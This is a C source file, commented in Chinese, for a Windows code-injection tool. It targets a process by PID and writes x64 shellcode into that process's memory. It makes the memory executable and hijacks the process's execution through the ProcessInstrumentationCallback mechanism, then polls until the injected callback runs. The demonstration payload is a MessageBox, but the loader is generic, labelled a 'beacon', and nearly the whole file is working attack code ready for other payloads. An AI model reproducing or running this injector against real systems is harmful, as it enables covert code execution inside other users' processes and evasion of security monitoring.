#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <winternl.h>

#define ProcessInstrumentationCallback 40
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// ProcessInstrumentationCallback 结构
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

// NtSetInformationProcess 函数指针
typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

// 根据进程名获取进程句柄
HANDLE getProcHandlebyName(const char *procName, DWORD *PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[x] Cannot retrieve the processes snapshot\n");
        return NULL;
    }

    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp(entry.szExeFile, procName) == 0) {
                *PID = entry.th32ProcessID;
                printf("[+] Found target process: PID %lu\n", *PID);
                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
                CloseHandle(snapshot);
                if (!hProc) {
                    printf("[x] Cannot open process: %lu\n", GetLastError());
                    return NULL;
                }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("[*] SetProcessInjection - ProcessInstrumentationCallback Injection\n");

    // 检查参数
    if (argc < 2) {
        printf("[!] Usage: %s <PID>\n", argv[0]);
        printf("[!] Example: %s 1234\n", argv[0]);
        return -1;
    }

    DWORD PID = atoi(argv[1]);
    if (PID == 0) {
        printf("[x] Invalid PID: %s\n", argv[1]);
        return -1;
    }

    // 获取 ntdll.dll 句柄
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[x] Cannot load NTDLL.DLL\n");
        return -1;
    }

    // 获取 NtSetInformationProcess 函数地址
    pNtSetInformationProcess NtSetInformationProcess =
        (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (!NtSetInformationProcess) {
        printf("[x] Cannot find NtSetInformationProcess\n");
        return -1;
    }

    // 获取目标进程句柄
    printf("[+] Target PID: %lu\n", PID);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProc) {
        printf("[x] Cannot open the target process (PID %lu)\n", PID);
        printf("[x] Error code: %lu\n", GetLastError());
        printf("[!] Make sure the process exists and you have sufficient privileges\n");
        return -1;
    }
    printf("[+] Opened target process: PID %lu\n", PID);

    printf("[+] Starting ProcessInstrumentationCallback deployment!\n");

    // MessageBox shellcode (x64)
    // 弹出消息框 "SetProcessInjection" / "Injected!"
    unsigned char beaconContent[] = {
        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28
        0x48, 0x31, 0xC9,                                           // xor rcx, rcx
        0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00,                   // lea rdx, [rip+0x1E]
        0x4C, 0x8D, 0x05, 0x27, 0x00, 0x00, 0x00,                   // lea r8, [rip+0x27]
        0x48, 0x31, 0xC0,                                           // xor rax, rax
        0x4D, 0x31, 0xC9,                                           // xor r9, r9
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA_addr (to be patched)
        0xFF, 0xD0,                                                 // call rax
        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28
        0xC3,                                                       // ret
        // "Injected!\0"
        0x49, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x65, 0x64, 0x21, 0x00,
        // "SetProcessInjection\0"
        0x53, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
        0x49, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00
    };
    SIZE_T beaconSize = sizeof(beaconContent);

    // 获取 MessageBoxA 地址并 patch 到 shellcode 中
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBoxA) {
        printf("[x] Cannot find MessageBoxA\n");
        CloseHandle(hProc);
        return -1;
    }
    *(DWORD64*)(beaconContent + 26) = (DWORD64)pMessageBoxA;

    // 在目标进程中分配 beacon 内存
    LPVOID beaconAddress = VirtualAllocEx(hProc, NULL, beaconSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!beaconAddress) {
        printf("[x] Cannot allocate beacon space: %lu\n", GetLastError());
        CloseHandle(hProc);
        return -1;
    }
    printf("[+] Beacon memory allocated at: %p\n", beaconAddress);

    // 49 字节的 shellcode 模板
    // 功能：保存寄存器 -> 调用 beacon -> 恢复寄存器 -> 返回
    SIZE_T shellcodeSize = 49;
    BYTE shellcodeTemplate[49] = {
        0x55,                                                       // push rbp
        0x48, 0x89, 0xe5,                                          // mov rbp, rsp
        // 自修改标记（第一次执行后会被修改）
        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
        // 保存寄存器
        0x50,                                                       // push rax
        0x53,                                                       // push rbx
        0x51,                                                       // push rcx
        0x41, 0x51,                                                // push r9
        0x41, 0x52,                                                // push r10
        0x41, 0x53,                                                // push r11
        // 调用 beacon
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, beacon_address (offset 26)
        0xff, 0xd0,                                                // call rax
        // 恢复寄存器
        0x41, 0x5b,                                                // pop r11
        0x41, 0x5a,                                                // pop r10
        0x41, 0x59,                                                // pop r9
        0x59,                                                       // pop rcx
        0x5b,                                                       // pop rbx
        0x58,                                                       // pop rax
        0x5d,                                                       // pop rbp
        0x41, 0xff, 0xe2                                           // jmp r10
    };

    BYTE shellcodeContent[49];
    memcpy(shellcodeContent, shellcodeTemplate, shellcodeSize);
    // 在 offset 26 处注入 beacon 地址
    *(DWORD64*)(shellcodeContent + 26) = (DWORD64)beaconAddress;

    // 分配 shellcode 内存
    LPVOID shellcodeAddress = VirtualAllocEx(hProc, NULL, shellcodeSize,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcodeAddress) {
        printf("[x] Cannot allocate shellcode space: %lu\n", GetLastError());
        VirtualFreeEx(hProc, beaconAddress, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -1;
    }
    printf("[+] Shellcode memory allocated at: %p\n", shellcodeAddress);

    // 写入 beacon 内容
    BOOL status = WriteProcessMemory(hProc, beaconAddress, beaconContent, beaconSize, NULL);
    if (!status) {
        printf("[x] Cannot write beacon content: %lu\n", GetLastError());
        VirtualFreeEx(hProc, beaconAddress, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, shellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -1;
    }
    printf("[+] Beacon content written at %p\n", beaconAddress);

    // 写入 shellcode 内容
    status = WriteProcessMemory(hProc, shellcodeAddress, shellcodeContent, shellcodeSize, NULL);
    if (!status) {
        printf("[x] Cannot write shellcode content: %lu\n", GetLastError());
        VirtualFreeEx(hProc, beaconAddress, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, shellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -1;
    }
    printf("[+] Shellcode content written at %p\n", shellcodeAddress);

    // 修改 beacon 内存保护属性为 RX
    DWORD oldProtect = 0;
    status = VirtualProtectEx(hProc, beaconAddress, beaconSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!status) {
        printf("[x] Failed to reprotect beacon memory: %lu\n", GetLastError());
    } else {
        printf("[+] Beacon memory reprotected to RX\n");
    }

    // 修改 shellcode 内存保护属性为 RWX（需要自修改）
    status = VirtualProtectEx(hProc, shellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!status) {
        printf("[x] Failed to reprotect shellcode memory: %lu\n", GetLastError());
    } else {
        printf("[+] Shellcode memory reprotected to RWX\n");
    }

    // 设置 ProcessInstrumentationCallback
    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
    InstrumentationCallbackInfo.Version = 0;
    InstrumentationCallbackInfo.Reserved = 0;
    InstrumentationCallbackInfo.Callback = shellcodeAddress;

    NTSTATUS ntStatus = NtSetInformationProcess(
        hProc,
        (PROCESSINFOCLASS)ProcessInstrumentationCallback,
        &InstrumentationCallbackInfo,
        sizeof(InstrumentationCallbackInfo)
    );

    if (!NT_SUCCESS(ntStatus)) {
        printf("[x] Failed to deploy hook: 0x%lX\n", ntStatus);
        VirtualFreeEx(hProc, beaconAddress, 0, MEM_RELEASE);
        VirtualFreeEx(hProc, shellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -1;
    }
    printf("[+] ProcessInstrumentationCallback deployed successfully!\n");

    // 监控 shellcode 第一个字节的变化（检测回调是否被执行）
    printf("\n[*] Monitoring callback execution...\n");
    printf("[!] Interact with notepad.exe (type, click menu, etc.) to trigger the callback\n");

    BOOL hookCalled = FALSE;
    int attemptCount = 0;
    do {
        printf("[-] Waiting 5 seconds for the hook to be called... (attempt %d)\n", ++attemptCount);
        Sleep(5000);

        BYTE content[1];
        SIZE_T bytesRead;
        status = ReadProcessMemory(hProc, shellcodeAddress, &content, 1, &bytesRead);
        if (!status) {
            printf("[x] Cannot read process memory: %lu\n", GetLastError());
            break;
        }

        printf("\t[-] First byte value: 0x%02X (original: 0x%02X)\n", content[0], shellcodeContent[0]);

        // 如果第一个字节被修改，说明回调已执行
        hookCalled = (content[0] != shellcodeContent[0]);

        if (attemptCount >= 12) {  // 1 分钟后超时
            printf("[!] Timeout - callback may not have been triggered\n");
            break;
        }
    } while (!hookCalled);

    if (hookCalled) {
        printf("\n[+] Callback executed! Your payload should have run!\n");
        printf("[+] Check for the MessageBox in notepad.exe\n");
    }

    // 清理
    CloseHandle(hProc);

    return 0;
}
